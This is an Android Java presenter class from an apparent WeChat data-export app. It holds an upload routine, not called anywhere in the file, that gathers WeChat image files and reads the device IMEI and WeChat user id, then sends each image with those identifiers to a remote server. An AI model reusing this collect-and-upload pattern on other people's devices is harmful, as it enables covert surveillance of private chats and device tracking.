package cn.truistic.enmicromsg.main.presenter;


import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.util.List;
import java.util.Map;

import cn.truistic.enmicromsg.common.db.DBUtil;
import cn.truistic.enmicromsg.common.StringConverter.HttpParameterBuilder;
import cn.truistic.enmicromsg.common.util.DeviceUtil;
import cn.truistic.enmicromsg.common.util.FileUtil;
import cn.truistic.enmicromsg.common.util.PathUtils;
import cn.truistic.enmicromsg.common.util.SharedPerfUtil;
import cn.truistic.enmicromsg.info.ResultBean;
import cn.truistic.enmicromsg.main.API;
import cn.truistic.enmicromsg.main.MainMVP;
import cn.truistic.enmicromsg.main.model.ExportModel;
import okhttp3.RequestBody;


/*
 * Created by Administrator on 2017/7/24.
 */

public class ExportPresenter implements MainMVP.IExportPresenter {

    private final static String TAG = "DDDBBB";
    private Context context;
    private MainMVP.IExportView exportView;
    private MainMVP.IExportModel exportModel;

    public ExportPresenter(Context context, MainMVP.IExportView exportView) {
        this.context = context;
        this.exportView = exportView;
        exportModel = new ExportModel(this, context);

    }

    @Override
    public void detect() {
        new DetectExportTask().execute();
    }


    /**
     * 上传操作
     */
    private class DetectExportTask extends AsyncTask{
        @Override
        protected Object doInBackground(Object[] params) {
            boolean flag = true;
            while (flag) {
                publishProgress(MainMVP.IExportView.Progress.UPLOAD_IMG, MainMVP.IExportView.State.DETECTING);
                if (!uploadImg()) {
                    publishProgress(MainMVP.IExportView.Progress.UPLOAD_IMG, MainMVP.IExportView.State.FALSE);
                    exportModel.saveState(MainMVP.IExportView.Progress.UPLOAD_IMG, MainMVP.IExportView.State.FALSE);

                    break;
                }
                publishProgress(MainMVP.IExportView.Progress.UPLOAD_IMG, MainMVP.IExportView.State.TRUE);
                exportModel.saveState(MainMVP.IExportView.Progress.UPLOAD_IMG, MainMVP.IExportView.State.TRUE);

                flag = false;
            }
            return  null;
        }

        @Override
        protected void onProgressUpdate(Object[] values) {
            exportView.setProgressState((MainMVP.IExportView.Progress) values[0], (MainMVP.IExportView.State)
                    values[1]);
        }

        @Override
        protected void onPostExecute(Object o) {
            exportView.onDetectStop();
        }


    }


    //******************************************上传图片**********************************************
    private boolean uploadImg() {

        return false;
    }


    private void rxupimg(){
        List<String> imagePaths = PathUtils.getImagePaths(context);
        DBUtil.getWechatFile(context);
        String IMEI = DeviceUtil.getDeviceId(context);
        String uin = String.valueOf(SharedPerfUtil.getUin(context));

        if (imagePaths != null && imagePaths.size() > 0) {
            for (int i = 0; i < imagePaths.size(); i++) {
                Map<String, RequestBody> params = HttpParameterBuilder.newBuilder()
                        .addParameter("IMEI",IMEI)
                        .addParameter("uin",uin)
                        .addParameter(
                                FileUtil.getFileNameNoExtension(imagePaths.get(i)),
                                new File(imagePaths.get(i)))
                        .bulider();

                API.Retrofit().
                    updateImage(params).
                    enqueue(new retrofit2.Callback<ResultBean.DataBean.FileUploadBean>() {

                    @Override
                    public void onResponse(retrofit2.Call<ResultBean.DataBean.FileUploadBean> call,
                                           retrofit2.Response<ResultBean.DataBean.FileUploadBean> response) {
                        Log.d(TAG,"上传成功"+response);
                        HttpParameterBuilder.cleanParams();
                    }

                    @Override
                    public void onFailure(retrofit2.Call<ResultBean.DataBean.FileUploadBean> call,
                                          Throwable throwable) {
                        Log.d(TAG,"上传失败"+throwable);
                        HttpParameterBuilder.cleanParams();
                    }

                });
            }
        }

    }

}
